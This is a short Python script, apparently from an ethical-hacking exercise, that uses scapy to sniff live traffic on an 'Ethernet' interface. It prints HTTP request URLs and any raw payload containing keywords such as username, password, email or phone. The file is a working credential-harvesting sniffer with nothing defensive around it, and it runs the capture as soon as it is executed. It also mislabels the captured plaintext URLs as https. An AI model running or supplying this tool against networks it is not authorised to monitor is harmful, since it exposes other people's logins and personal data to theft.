import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"Http url is: {url}")
        credentials = get_login_info(packet)
        if credentials:
            print("Username/Password: {}".format(credentials))


def get_url(packet):
    http_layer = packet[http.HTTPRequest]
    host = http_layer.Host.decode("utf-8", errors="ignore") if http_layer.Host else ""
    path = http_layer.Path.decode("utf-8", errors="ignore") if http_layer.Path else ""
    return f"https://{host}{path}"


keywords = [
    "username",
    "user",
    "login",
    "password",
    "pass",
    "custname",
    "custemail",
    "email",
    "user_name",
    "user_email",
    "user_pass",
    "user_password",
    "telephone",
    "phone",
    "custtel",
]


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode("utf-8")
        for key in keywords:
            if key in field_load:
                return field_load


sniff("Ethernet")
